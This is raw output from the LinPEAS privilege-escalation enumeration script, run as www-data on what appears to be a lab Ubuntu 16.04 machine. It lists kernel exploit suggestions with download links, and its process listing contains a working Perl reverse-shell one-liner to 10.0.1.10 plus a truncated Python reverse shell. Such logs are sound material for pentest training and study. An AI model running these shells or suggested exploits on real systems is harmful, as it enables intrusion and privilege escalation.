          ▄▄▄▄▄▄              ▄▄▄▄▄▄▄▄                 ▄▄▄▄ 
          ▄▄                  ▄▄▄ ▄▄▄▄▄                  ▄▄▄
          ▄▄                ▄▄▄▄▄▄▄▄▄▄▄▄                  ▄▄
          ▄            ▄▄ ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄   ▄▄
          ▄      ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄                                ▄▄▄▄
          ▄▄▄▄▄  ▄▄▄▄▄                       ▄▄▄▄▄▄     ▄▄▄▄
          ▄▄▄▄   ▄▄▄▄▄                       ▄▄▄▄▄      ▄ ▄▄
          ▄▄▄▄▄  ▄▄▄▄▄        ▄▄▄▄▄▄▄        ▄▄▄▄▄     ▄▄▄▄▄
          ▄▄▄▄▄▄  ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄      ▄▄▄▄▄▄▄   ▄▄▄▄▄ 
            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄        ▄          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ 
          ▄▄▄▄▄▄▄▄▄▄▄▄▄                       ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▄▄▄▄▄▄▄▄▄▄▄                         ▄▄▄▄▄▄▄▄▄▄▄▄▄▄
          ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄            ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄
            ▀▀▄▄▄   ▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄ ▄▄▄▄▄▄▄▀▀▀▀▀▀
                ▀▀▀▄▄▄▄▄      ▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▀▀
                      ▀▀▀▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▄▀▀▀

      /---------------------------------------------------------------------------------\
      |                             Do you like PEASS?                                  |                                          
      |---------------------------------------------------------------------------------|                                          
      |         Learn Cloud Hacking       :     https://training.hacktricks.xyz         |                                          
      |         Follow on Twitter         :     @hacktricks_live                        |                                          
      |         Respect on HTB            :     SirBroccoli                             |                                          
      |---------------------------------------------------------------------------------|                                          
      |                                 Thank you!                                      |                                          
      \---------------------------------------------------------------------------------/                                          
            LinPEAS-ng by carlospolop                                                                                              
                                                                                                                                  
  ADVISORY: This script should be used for authorized penetration testing and/or educational purposes only. Any misuse of this software will not be the responsibility of the author or of any other collaborator. Use it at your own computers and/or with the computer owner's permission.                                                                                                         
                                                                                                                                  
  Linux Privesc Checklist: https://book.hacktricks.wiki/en/linux-hardening/linux-privilege-escalation-checklist.html
  LEGEND:                                                                                                                         
    RED/YELLOW: 95% a PE vector
    RED: You should take a look to it
    LightCyan: Users with console
    Blue: Users without console & mounted devs
    Green: Common things (users, groups, SUID/SGID, mounts, .sh scripts, cronjobs) 
    LightMagenta: Your username

  Starting LinPEAS. Caching Writable Folders...
                                ╔═══════════════════╗
  ═══════════════════════════════╣ Basic information ╠═══════════════════════════════                                              
                                ╚═══════════════════╝                                                                             
  OS: Linux version 4.4.0-21-generic (buildd@lgw01-21) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2) ) #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016
  User & Groups: uid=33(www-data) gid=33(www-data) groups=33(www-data)
  Hostname: ubuntu

  [+] /bin/ping is available for network discovery (LinPEAS can discover hosts, learn more with -h)
  [+] /bin/bash is available for network discovery, port scanning and port forwarding (LinPEAS can discover hosts, scan ports, and forward ports. Learn more with -h)                                                                                               
  [+] /bin/nc is available for network discovery & port scanning (LinPEAS can discover hosts and scan ports, learn more with -h)   
                                                                                                                                  

  Caching directories . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . . uniq: write error: Broken pipe
  DONE
                                                                                                                                  
                                ╔════════════════════╗
  ══════════════════════════════╣ System Information ╠══════════════════════════════                                               
                                ╚════════════════════╝                                                                             
  ╔══════════╣ Operative system
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#kernel-exploits                                
  Linux version 4.4.0-21-generic (buildd@lgw01-21) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2) ) #37-Ubuntu SMP Mon Apr 18 18:33:37 UTC 2016
  Distributor ID: Ubuntu
  Description:    Ubuntu 16.04 LTS
  Release:        16.04
  Codename:       xenial

  ╔══════════╣ Sudo version
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-version                                   
  Sudo version 1.8.16                                                                                                              


  ╔══════════╣ PATH
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-path-abuses                           
  /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin                                                                     

  ╔══════════╣ Date & uptime
  Sat Nov 22 06:54:04 PST 2025                                                                                                     
  06:54:04 up 2 days,  2:36,  0 users,  load average: 0.20, 0.36, 0.37

  ╔══════════╣ Unmounted file-system?
  ╚ Check if you can mount umounted devices                                                                                        
  UUID=126bcf25-b08a-43d2-8690-56c2679e9cf1 /               ext4    errors=remount-ro 0       1                                    
  UUID=c5be5017-8a55-477c-ac2a-e50676dacfd2 none            swap    sw              0       0
  /dev/fd0        /media/floppy0  auto    rw,user,noauto,exec,utf8 0       0

  ╔══════════╣ Any sd*/disk* disk in /dev? (limit 20)
  disk                                                                                                                             
  sda
  sda1
  sda2
  sda5

  ╔══════════╣ Environment
  ╚ Any private information inside environment variables?                                                                          
  RPORT=9002                                                                                                                       
  OLDPWD=/tmp
  APACHE_RUN_DIR=/var/run/apache2
  APACHE_PID_FILE=/var/run/apache2/apache2.pid
  APACHE_LOCK_DIR=/var/lock/apache2
  LANG=C
  APACHE_RUN_USER=www-data
  APACHE_RUN_GROUP=www-data
  APACHE_LOG_DIR=/var/log/apache2
  PWD=/tmp/test-pedro
  RHOST=10.0.1.5

  ╔══════════╣ Searching Signature verification failed in dmesg
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#dmesg-signature-verification-failed            
  dmesg Not Found                                                                                                                  
                                                                                                                                  
  ╔══════════╣ Executing Linux Exploit Suggester
  ╚ https://github.com/mzet-/linux-exploit-suggester                                                                               
  cat: write error: Broken pipe                                                                                                    
  cat: write error: Broken pipe
  cat: write error: Broken pipe
  cat: write error: Broken pipe
  cat: write error: Broken pipe
  cat: write error: Broken pipe
  cat: write error: Broken pipe
  cat: write error: Broken pipe
  cat: write error: Broken pipe
  cat: write error: Broken pipe
  cat: write error: Broken pipe
  cat: write error: Broken pipe
  [+] [CVE-2016-5195] dirtycow 2

    Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
    Exposure: highly probable
    Tags: debian=7|8,RHEL=5|6|7,ubuntu=14.04|12.04,ubuntu=10.04{kernel:2.6.32-21-generic},[ ubuntu=16.04{kernel:4.4.0-21-generic} ]
    Download URL: https://www.exploit-db.com/download/40839
    ext-url: https://www.exploit-db.com/download/40847
    Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

  [+] [CVE-2017-16995] eBPF_verifier

    Details: https://ricklarabee.blogspot.com/2018/07/ebpf-and-analysis-of-get-rekt-linux.html
    Exposure: highly probable
    Tags: debian=9.0{kernel:4.9.0-3-amd64},fedora=25|26|27,ubuntu=14.04{kernel:4.4.0-89-generic},[ ubuntu=(16.04|17.04) ]{kernel:4.(8|10).0-(19|28|45)-generic}
    Download URL: https://www.exploit-db.com/download/45010
    Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

  [+] [CVE-2016-8655] chocobo_root

    Details: http://www.openwall.com/lists/oss-security/2016/12/06/1
    Exposure: highly probable
    Tags: [ ubuntu=(14.04|16.04){kernel:4.4.0-(21|22|24|28|31|34|36|38|42|43|45|47|51)-generic} ]
    Download URL: https://www.exploit-db.com/download/40871
    Comments: CAP_NET_RAW capability is needed OR CONFIG_USER_NS=y needs to be enabled

  [+] [CVE-2016-5195] dirtycow

    Details: https://github.com/dirtycow/dirtycow.github.io/wiki/VulnerabilityDetails
    Exposure: highly probable
    Tags: debian=7|8,RHEL=5{kernel:2.6.(18|24|33)-*},RHEL=6{kernel:2.6.32-*|3.(0|2|6|8|10).*|2.6.33.9-rt31},RHEL=7{kernel:3.10.0-*|4.2.0-0.21.el7},[ ubuntu=16.04|14.04|12.04 ]
    Download URL: https://www.exploit-db.com/download/40611
    Comments: For RHEL/CentOS see exact vulnerable versions here: https://access.redhat.com/sites/default/files/rh-cve-2016-5195_5.sh

  [+] [CVE-2016-4557] double-fdput()

    Details: https://bugs.chromium.org/p/project-zero/issues/detail?id=808
    Exposure: highly probable
    Tags: [ ubuntu=16.04{kernel:4.4.0-21-generic} ]
    Download URL: https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
    Comments: CONFIG_BPF_SYSCALL needs to be set && kernel.unprivileged_bpf_disabled != 1

  [+] [CVE-2021-3156] sudo Baron Samedit 2

    Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
    Exposure: probable
    Tags: centos=6|7|8,[ ubuntu=14|16|17|18|19|20 ], debian=9|10
    Download URL: https://codeload.github.com/worawit/CVE-2021-3156/zip/main

  [+] [CVE-2017-7308] af_packet

    Details: https://googleprojectzero.blogspot.com/2017/05/exploiting-linux-kernel-via-packet.html
    Exposure: probable
    Tags: [ ubuntu=16.04 ]{kernel:4.8.0-(34|36|39|41|42|44|45)-generic}
    Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-7308/poc.c
    ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-7308/poc.c
    Comments: CAP_NET_RAW cap or CONFIG_USER_NS=y needed. Modified version at 'ext-url' adds support for additional kernels

  [+] [CVE-2017-6074] dccp

    Details: http://www.openwall.com/lists/oss-security/2017/02/22/3
    Exposure: probable
    Tags: [ ubuntu=(14.04|16.04) ]{kernel:4.4.0-62-generic}
    Download URL: https://www.exploit-db.com/download/41458
    Comments: Requires Kernel be built with CONFIG_IP_DCCP enabled. Includes partial SMEP/SMAP bypass

  [+] [CVE-2017-1000112] NETIF_F_UFO

    Details: http://www.openwall.com/lists/oss-security/2017/08/13/1
    Exposure: probable
    Tags: ubuntu=14.04{kernel:4.4.0-*},[ ubuntu=16.04 ]{kernel:4.8.0-*}
    Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2017-1000112/poc.c
    ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2017-1000112/poc.c
    Comments: CAP_NET_ADMIN cap or CONFIG_USER_NS=y needed. SMEP/KASLR bypass included. Modified version at 'ext-url' adds support for additional distros/kernels

  [+] [CVE-2022-32250] nft_object UAF (NFT_MSG_NEWSET)

    Details: https://research.nccgroup.com/2022/09/01/settlers-of-netlink-exploiting-a-limited-uaf-in-nf_tables-cve-2022-32250/
  https://blog.theori.io/research/CVE-2022-32250-linux-kernel-lpe-2022/
    Exposure: less probable
    Tags: ubuntu=(22.04){kernel:5.15.0-27-generic}
    Download URL: https://raw.githubusercontent.com/theori-io/CVE-2022-32250-exploit/main/exp.c
    Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

  [+] [CVE-2022-2586] nft_object UAF

    Details: https://www.openwall.com/lists/oss-security/2022/08/29/5
    Exposure: less probable
    Tags: ubuntu=(20.04){kernel:5.12.13}
    Download URL: https://www.openwall.com/lists/oss-security/2022/08/29/5/1
    Comments: kernel.unprivileged_userns_clone=1 required (to obtain CAP_NET_ADMIN)

  [+] [CVE-2021-3156] sudo Baron Samedit

    Details: https://www.qualys.com/2021/01/26/cve-2021-3156/baron-samedit-heap-based-overflow-sudo.txt
    Exposure: less probable
    Tags: mint=19,ubuntu=18|20, debian=10
    Download URL: https://codeload.github.com/blasty/CVE-2021-3156/zip/main

  [+] [CVE-2021-22555] Netfilter heap out-of-bounds write

    Details: https://google.github.io/security-research/pocs/linux/cve-2021-22555/writeup.html
    Exposure: less probable
    Tags: ubuntu=20.04{kernel:5.8.0-*}
    Download URL: https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
    ext-url: https://raw.githubusercontent.com/bcoles/kernel-exploits/master/CVE-2021-22555/exploit.c
    Comments: ip_tables kernel module must be loaded

  [+] [CVE-2019-18634] sudo pwfeedback

    Details: https://dylankatz.com/Analysis-of-CVE-2019-18634/
    Exposure: less probable
    Tags: mint=19
    Download URL: https://github.com/saleemrashid/sudo-cve-2019-18634/raw/master/exploit.c
    Comments: sudo configuration requires pwfeedback to be enabled.

  [+] [CVE-2019-15666] XFRM_UAF

    Details: https://duasynt.com/blog/ubuntu-centos-redhat-privesc
    Exposure: less probable
    Download URL: 
    Comments: CONFIG_USER_NS needs to be enabled; CONFIG_XFRM needs to be enabled

  [+] [CVE-2018-1000001] RationalLove

    Details: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/
    Exposure: less probable
    Tags: debian=9{libc6:2.24-11+deb9u1},ubuntu=16.04.3{libc6:2.23-0ubuntu9}
    Download URL: https://www.halfdog.net/Security/2017/LibcRealpathBufferUnderflow/RationalLove.c
    Comments: kernel.unprivileged_userns_clone=1 required

  [+] [CVE-2017-1000366,CVE-2017-1000379] linux_ldso_hwcap_64

    Details: https://www.qualys.com/2017/06/19/stack-clash/stack-clash.txt
    Exposure: less probable
    Tags: debian=7.7|8.5|9.0,ubuntu=14.04.2|16.04.2|17.04,fedora=22|25,centos=7.3.1611
    Download URL: https://www.qualys.com/2017/06/19/stack-clash/linux_ldso_hwcap_64.c
    Comments: Uses "Stack Clash" technique, works against most SUID-root binaries

  [+] [CVE-2017-1000253] PIE_stack_corruption

    Details: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.txt
    Exposure: less probable
    Tags: RHEL=6,RHEL=7{kernel:3.10.0-514.21.2|3.10.0-514.26.1}
    Download URL: https://www.qualys.com/2017/09/26/linux-pie-cve-2017-1000253/cve-2017-1000253.c

  [+] [CVE-2016-9793] SO_{SND|RCV}BUFFORCE

    Details: https://github.com/xairy/kernel-exploits/tree/master/CVE-2016-9793
    Exposure: less probable
    Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-9793/poc.c
    Comments: CAP_NET_ADMIN caps OR CONFIG_USER_NS=y needed. No SMEP/SMAP/KASLR bypass included. Tested in QEMU only

  [+] [CVE-2016-2384] usb-midi

    Details: https://xairy.github.io/blog/2016/cve-2016-2384
    Exposure: less probable
    Tags: ubuntu=14.04,fedora=22
    Download URL: https://raw.githubusercontent.com/xairy/kernel-exploits/master/CVE-2016-2384/poc.c
    Comments: Requires ability to plug in a malicious USB device and to execute a malicious binary as a non-privileged user

  [+] [CVE-2016-0728] keyring

    Details: http://perception-point.io/2016/01/14/analysis-and-exploitation-of-a-linux-kernel-vulnerability-cve-2016-0728/
    Exposure: less probable
    Download URL: https://www.exploit-db.com/download/40003
    Comments: Exploit takes about ~30 minutes to run. Exploit is not reliable, see: https://cyseclabs.com/blog/cve-2016-0728-poc-not-working


  ╔══════════╣ Protections
  ═╣ AppArmor enabled? .............. You do not have enough privilege to read the profile set.                                    
  apparmor module is loaded.
  ═╣ AppArmor profile? .............. unconfined
  ═╣ is linuxONE? ................... s390x Not Found
  ═╣ grsecurity present? ............ grsecurity Not Found                                                                         
  ═╣ PaX bins present? .............. PaX Not Found                                                                                
  ═╣ Execshield enabled? ............ Execshield Not Found                                                                         
  ═╣ SELinux enabled? ............... sestatus Not Found                                                                           
  ═╣ Seccomp enabled? ............... disabled                                                                                     
  ═╣ User namespace? ................ enabled
  ═╣ Cgroup2 enabled? ............... disabled
  ═╣ Is ASLR enabled? ............... Yes
  ═╣ Printer? ....................... No
  ═╣ Is this a virtual machine? ..... Yes (vmware)                                                                                 

  ╔══════════╣ Kernel Modules Information
  ══╣ Kernel modules with weak perms?                                                                                              
                                                                                                                                  
  ══╣ Kernel modules loadable? 
  Modules can be loaded                                                                                                            



                                    ╔═══════════╗
  ═══════════════════════════════════╣ Container ╠═══════════════════════════════════                                              
                                    ╚═══════════╝                                                                                 
  ╔══════════╣ Container related tools present (if any):
  /sbin/apparmor_parser                                                                                                            
  /usr/bin/nsenter
  /usr/bin/unshare
  /usr/sbin/chroot
  /sbin/capsh
  /sbin/setcap
  /sbin/getcap

  ╔══════════╣ Container details
  ═╣ Is this a container? ........... No                                                                                           
  ═╣ Any running containers? ........ No                                                                                           
                                                                                                                                  


                                      ╔═══════╗
  ═════════════════════════════════════╣ Cloud ╠═════════════════════════════════════ 

  Learn and practice cloud hacking techniques in https://training.hacktricks.xyz
                                                                                                                                 
  ═╣ GCP Virtual Machine? ................. No
  ═╣ GCP Cloud Funtion? ................... No
  ═╣ AWS ECS? ............................. No
  ═╣ AWS EC2? ............................. No
  ═╣ AWS EC2 Beanstalk? ................... No
  ═╣ AWS Lambda? .......................... No
  ═╣ AWS Codebuild? ....................... No
  ═╣ DO Droplet? .......................... No
  ═╣ IBM Cloud VM? ........................ No
  ═╣ Azure VM or Az metadata? ............. No
  ═╣ Azure APP or IDENTITY_ENDPOINT? ...... No
  ═╣ Azure Automation Account? ............ No
  ═╣ Aliyun ECS? .......................... No
  ═╣ Tencent CVM? ......................... No



                  ╔════════════════════════════════════════════════╗
  ════════════════╣ Processes, Crons, Timers, Services and Sockets ╠════════════════                                               
                  ╚════════════════════════════════════════════════╝                                                               
  ╔══════════╣ Running processes (cleaned)
  ╚ Check weird & unexpected processes run by root: https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#processes                                                                                                                       
  root          1  0.0  0.1  37868  5896 ?        Ss   Nov20   0:06 /sbin/init noprompt                                            
  root        306  0.0  0.0  32120  3960 ?        Ss   Nov20   0:00 /lib/systemd/systemd-journald
  root        365  0.0  0.0 306360   264 ?        Ssl  Nov20   0:00 vmware-vmblock-fuse /run/vmblock-fuse -o rw,subtype=vmware-vmblock,default_permissions,allow_other,dev,suid
  root        369  0.0  0.1  48496  7728 ?        Ss   Nov20   0:01 /lib/systemd/systemd-udevd
  root        391  0.0  0.2 190068 10324 ?        Ssl  Nov20   1:20 /usr/bin/vmtoolsd
  systemd+    440  0.0  0.0 100324  2540 ?        Ssl  Nov20   0:23 /lib/systemd/systemd-timesyncd
    └─(Caps) 0x0000000002000000=cap_sys_time
  root        593  0.0  0.1 275860  6296 ?        Ssl  Nov20   0:01 /usr/lib/accountsservice/accounts-daemon[0m
  syslog      594  0.0  0.1 256392  5348 ?        Ssl  Nov20   0:00 /usr/sbin/rsyslogd -n
  root        595  0.0  0.0  20096  1192 ?        Ss   Nov20   0:00 /lib/systemd/systemd-logind
  root        602  0.0  0.0  29008  2876 ?        Ss   Nov20   0:00 /usr/sbin/cron -f
  root        603  0.0  0.2  85520  9956 ?        Ss   Nov20   0:00 /usr/bin/VGAuthService
  message+    612  0.0  0.1  43020  4224 ?        Ss   Nov20   0:00 /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation
    └─(Caps) 0x0000000020000000=cap_audit_write
  root        647  0.0  0.0  15936  1716 tty1     Ss+  Nov20   0:00 /sbin/agetty --noclear tty1 linux
  root        660  0.0  0.0  19616  2156 ?        Ss   Nov20   0:13 /usr/sbin/irqbalance --pid=/var/run/irqbalance.pid
  root        709  0.0  0.0  16120  2880 ?        Ss   Nov20   0:00 /sbin/dhclient -1 -v -pf /run/dhclient.ens33.pid -lf /var/lib/dhcp/dhclient.ens33.leases -I -df /var/lib/dhcp/dhclient6.ens33.leases ens33
  root        827  0.0  0.0  24136  3940 ?        Ss   Nov20   0:00 /usr/sbin/vsftpd /etc/vsftpd.conf
  root        845  0.0  0.1  65600  6064 ?        Ss   Nov20   0:00 /usr/sbin/sshd -D
  root        852  0.0  0.0 125068  1360 ?        Ss   Nov20   0:00 nginx: master process /usr/sbin/nginx -g daemon[0m on; master_process on;
  www-data    853  0.0  0.0 125504  3828 ?        S    Nov20   0:13  _ nginx: worker process
  www-data    854  0.0  0.0 125504  3892 ?        S    Nov20   0:01  _ nginx: worker process
  root        860  0.0  0.6 262700 27396 ?        Ss   Nov20   0:06 /usr/sbin/apache2 -k start
  www-data  11259  0.0  0.3 263628 15244 ?        S    06:25   0:00  _ /usr/sbin/apache2 -k start
  www-data  11403  0.0  0.0   4504  1600 pts/0    Ss   06:28   0:00  |           _ sh
  root      15786  0.0  0.0  41088  2688 pts/0    S+   06:31   0:00  |               _ passwd
  www-data  11376  0.0  0.3 263496 14876 ?        S    06:28   0:01  _ /usr/sbin/apache2 -k start
  www-data  43987  0.0  0.0   4504  1668 pts/2    Ss   06:34   0:00  |           _ sh
  www-data 116112  0.0  0.0   5324  2592 pts/2    S+   06:53   0:00  |               _ /bin/sh ./linpeas.sh
  www-data 120484  0.0  0.0   5324   972 pts/2    S+   06:57   0:00  |                   _ /bin/sh ./linpeas.sh
  www-data 120488  0.0  0.0  34724  3216 pts/2    R+   06:57   0:00  |                   |   _ ps fauxwww
  www-data 120487  0.0  0.0   5324   972 pts/2    S+   06:57   0:00  |                   _ /bin/sh ./linpeas.sh
  www-data  11397  0.0  0.3 263496 14876 ?        S    06:28   0:00  _ /usr/sbin/apache2 -k start
  www-data  15791  0.0  0.0   4504  1700 pts/1    Ss   06:32   0:00  |           _ sh
  www-data  43979  0.0  0.0   4396   696 pts/1    S+   06:34   0:00  |               _ cat f
  www-data  43992  0.2  0.3 263512 15188 ?        S    06:34   0:03  _ /usr/sbin/apache2 -k start
  www-data  44013  0.1  0.3 263496 14880 ?        S    06:36   0:01  _ /usr/sbin/apache2 -k start
  www-data  48470  0.0  0.0   4504   832 ?        S    06:41   0:00  |   _ sh -c perl -e 'use Socket;$i="10.0.1.10";$p=1000;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
  www-data  48471  0.0  0.0  18212  3220 ?        S    06:41   0:00  |       _ /bin/bash -i
  www-data  48486  0.2  0.1 262780  8016 ?        S    06:42   0:02  _ /usr/sbin/apache2 -k start
  www-data  83063  0.2  0.1 262780  8016 ?        S    06:44   0:01  _ /usr/sbin/apache2 -k start
  www-data  84234  0.2  0.1 262780  8016 ?        S    06:45   0:01  _ /usr/sbin/apache2 -k start
  www-data 115522  0.1  0.1 262780  8016 ?        S    06:46   0:01  _ /usr/sbin/apache2 -k start
  www-data 116050  0.1  0.1 262780  8016 ?        S    06:48   0:00  _ /usr/sbin/apache2 -k start
  www-data 116069  0.1  0.1 262780  8016 ?        S    06:49   0:00  _ /usr/sbin/apache2 -k start
  www-data 116082  0.0  0.1 262780  8016 ?        S    06:50   0:00  _ /usr/sbin/apache2 -k start
  www-data 116098  0.0  0.1 262780  8016 ?        S    06:51   0:00  _ /usr/sbin/apache2 -k start
  www-data 116104  0.0  0.1 262780  8016 ?        S    06:51   0:00  _ /usr/sbin/apache2 -k start
  www-data  33725  0.0  0.0  18032  2032 ?        S    06:33   0:00 bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
  www-data  33728  0.0  0.0  18032   260 ?        S    06:33   0:00  _ bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
  www-data  33732  0.0  0.0  18032  2216 ?        S    06:33   0:00  |   _ bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
  www-data  33735  0.0  0.0   4416   840 ?        S    06:33   0:00  |       _ dd bs=9000 count=1
  www-data  33736  0.0  0.0   4372   640 ?        S    06:33   0:00  |       _ xxd
  www-data  33731  0.0  0.0  11288   920 ?        S    06:33   0:00  _ grep accessible
  www-data  73862  0.0  0.0  18032  1984 ?        S    06:44   0:00 bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
  www-data  73866  0.0  0.0  18032   264 ?        S    06:44   0:00  _ bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
  www-data  73870  0.0  0.0  18032  2172 ?        S    06:44   0:00  |   _ bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
  www-data  73875  0.0  0.0   4416   712 ?        S    06:44   0:00  |       _ dd bs=9000 count=1
  www-data  73876  0.0  0.0   4372   684 ?        S    06:44   0:00  |       _ xxd
  www-data  73867  0.0  0.0  11288  1028 ?        S    06:44   0:00  _ grep accessible
  www-data 105687  0.0  0.0  18032  2016 ?        S    06:46   0:00 bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
  www-data 105690  0.0  0.0  18032   260 ?        S    06:46   0:00  _ bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
  www-data 105695  0.0  0.0  18032  2204 ?        S    06:46   0:00  |   _ bash -c ((( echo cfc9 0100 0001 0000 0000 0000 0a64 7563 6b64 7563 6b67 6f03 636f 6d00 0001 0001 | xxd -p -r >&3; dd bs=9000 count=1 <&3 2>/dev/null | xxd ) 3>/dev/udp/1.1.1.1/53 && echo "DNS accessible") | grep "accessible" && exit 0 ) 2>/dev/null || echo "DNS is not accessible"
  www-data 105700  0.0  0.0   4416   784 ?        S    06:46   0:00  |       _ dd bs=9000 count=1
  www-data 105701  0.0  0.0   4372   792 ?        S    06:46   0:00  |       _ xxd
  www-data 105692  0.0  0.0  11288   928 ?        S    06:46   0:00  _ grep accessible

  ╔══════════╣ Processes with unusual configurations
  Process 709 (root) - /sbin/dhclient -1 -v -pf /run/dhclient.ens33.pid -lf /var/lib/dhcp/dhclient.ens33.leases -I -df /var        
  SELinux context: /sbin/dhclient (enforce)


  ╔══════════╣ Processes with credentials in memory (root req)
  ╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#credentials-from-process-memory                
  gdm-password Not Found                                                                                                           
  gnome-keyring-daemon Not Found                                                                                                   
  lightdm Not Found                                                                                                                
  vsftpd process found (dump creds from memory as root)                                                                            
  apache2 process found (dump creds from memory as root)
  sshd: Not Found
  mysql Not Found                                                                                                                  
  postgres Not Found                                                                                                               
  redis-server Not Found                                                                                                           
  mongod Not Found                                                                                                                 
  memcached Not Found                                                                                                              
  elasticsearch Not Found                                                                                                          
  jenkins Not Found                                                                                                                
  tomcat Not Found                                                                                                                 
  nginx process found (dump creds from memory as root)                                                                             
  php-fpm Not Found
  supervisord Not Found                                                                                                            
  vncserver Not Found                                                                                                              
  xrdp Not Found                                                                                                                   
  teamviewer Not Found                                                                                                             
                                                                                                                                  
  ╔══════════╣ Opened Files by processes
  Process 853 (www-data) - nginx: worker process                                                                                   
    └─ Has open files:
      └─ /var/log/nginx/access.log
      └─ /var/log/nginx/error.log
  Process 854 (www-data) - nginx: worker process                            
    └─ Has open files:
      └─ /var/log/nginx/error.log
      └─ /var/log/nginx/access.log
  Process 11401 (www-data) - sh -c export RHOST="10.0.1.5";export RPORT=9002;python3 -c 'import sys,socket,os,pty;s=socket.socket
    └─ Has open files:
      └─ pipe:[654107]
      └─ /var/log/apache2/error.log
